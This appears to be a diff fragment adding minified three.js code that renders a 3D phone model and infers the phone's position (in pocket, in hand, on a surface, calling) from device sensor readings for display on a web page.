+        function initVisualizer(){const e=document.getElementById("visualizer");e&&(e.innerHTML="",scene=new THREE.Scene,scene.background=new THREE.Color(15329769),camera=new THREE.PerspectiveCamera(50,e.clientWidth/e.clientHeight,.1,100),camera.position.set(0,1.6,6),renderer=new THREE.WebGLRenderer({antialias:!0}),renderer.setSize(e.clientWidth,e.clientHeight),renderer.setPixelRatio(window.devicePixelRatio),renderer.shadowMap.enabled=!0,e.appendChild(renderer.domElement),scene.add(new THREE.AmbientLight(16777215,.6)),(e=>{const t=new THREE.DirectionalLight(16777215,.8);t.position.set(5,10,7),t.castShadow=!0,scene.add(t)})(),controls=new THREE.OrbitControls(camera,renderer.domElement),controls.enableDamping=!0,controls.target.set(0,1.2,0),createEnvironment(),createPhoneModel(),startAnimationLoop(),window.addEventListener("resize",onWindowResize))}function createEnvironment(){const e=new THREE.BoxGeometry(5,.15,3),t=new THREE.MeshStandardMaterial({color:11388093}),o=new THREE.Mesh(e,t);o.position.y=0,o.receiveShadow=!0,scene.add(o);const n=new THREE.PlaneGeometry(20,20),a=new THREE.MeshStandardMaterial({color:16314874,roughness:.8}),i=new THREE.Mesh(n,a);i.rotation.x=-Math.PI/2,i.position.y=-.075,i.receiveShadow=!0,scene.add(i);const d=new THREE.BoxGeometry(1,1.8,.5),s=new THREE.MeshStandardMaterial({color:7104157,transparent:!0,opacity:.3,roughness:.7});pocketModel=new THREE.Mesh(d,s),pocketModel.visible=!1,scene.add(pocketModel)}function createPhoneModel(){phoneModel=new THREE.Group;const e=new THREE.BoxGeometry(.8,1.6,.1),t=new THREE.MeshStandardMaterial({color:1703936,metalness:.7,roughness:.3}),o=new THREE.Mesh(e,t);o.castShadow=!0;const n=document.createElement("canvas");n.width=128,n.height=256;const a=n.getContext("2d");a.fillStyle="#222",a.fillRect(0,0,128,256),a.fillStyle="#FFF",a.fillRect(24,240,80,8);const i=new THREE.CanvasTexture(n),d=new THREE.BoxGeometry(.75,1.55,.02),s=new THREE.MeshStandardMaterial({map:i,roughness:.1,metalness:.2}),c=new THREE.Mesh(d,s);c.position.z=.055,phoneModel.add(o,c),scene.add(phoneModel)}
+        function analyzeAndSetPosition(data){if(!phoneModel)return;let e=new THREE.Quaternion,t=!1;const o=data.rotation_vector||data.game_rotation_vector||data.geomagnetic_rotation_vector;if(o&&void 0!==o.w)e.set(o.x,o.y,o.z,o.w),t=!0;else if(data.gravity&&data.magnetometer){const n=new THREE.Vector3(data.gravity.x,data.gravity.y,data.gravity.z).normalize(),a=new THREE.Vector3(data.magnetometer.x,data.magnetometer.y,data.magnetometer.z).normalize(),i=a.clone().cross(n).normalize(),d=n.clone().cross(i).normalize(),s=new THREE.Matrix4().makeBasis(i,d,n);e.setFromRotationMatrix(s),t=!0}if(t){const c=new THREE.Quaternion().setFromAxisAngle(new THREE.Vector3(1,0,0),-Math.PI/2);e.multiplyQuaternions(c,e),phoneModel.quaternion.slerp(e,.5)}else phoneModel.quaternion.slerp(new THREE.Quaternion,.5);let l="Undetermined";pocketModel.visible=!1,data.pocket_mode?(l="In Pocket",pocketModel.visible=!0,pocketModel.position.set(0,1.2,0),phoneModel.position.copy(pocketModel.position)):void 0!==data.face_up_down?l=0===data.face_up_down?"On Surface (Face Up)":"On Surface (Face Down)":data.proximity?.distance<2&&data.light?.lux<10?(l="In Pocket / Bag",pocketModel.visible=!0,pocketModel.position.set(0,1.2,0),phoneModel.position.copy(pocketModel.position)):data.proximity?.distance<2?(l="Calling Position",phoneModel.position.set(0,1.3,0)):data.gravity?Math.abs(data.gravity.z)>9?(l="On a Surface",phoneModel.position.set(0,.8,0)):(l="In Hand",phoneModel.position.set(0,1.3,0)):phoneModel.position.set(0,1.3,0),t||"Undetermined"===l||(l+=" (Orientation Unavailable)"),document.getElementById("position-status").textContent=l}
+        function startAnimationLoop(){animationFrameId&&cancelAnimationFrame(animationFrameId);const e=()=>{animationFrameId=requestAnimationFrame(e),controls.update(),renderer.render(scene,camera)};e()}function stopAnimationLoop(){animationFrameId&&(cancelAnimationFrame(animationFrameId),animationFrameId=null),window.removeEventListener("resize",onWindowResize)}function onWindowResize(){const e=document.getElementById("visualizer");e&&camera&&renderer&&(camera.aspect=e.clientWidth/e.clientHeight,camera.updateProjectionMatrix(),renderer.setSize(e.clientWidth,e.clientHeight))}
     </script>
 </body>
 </html>
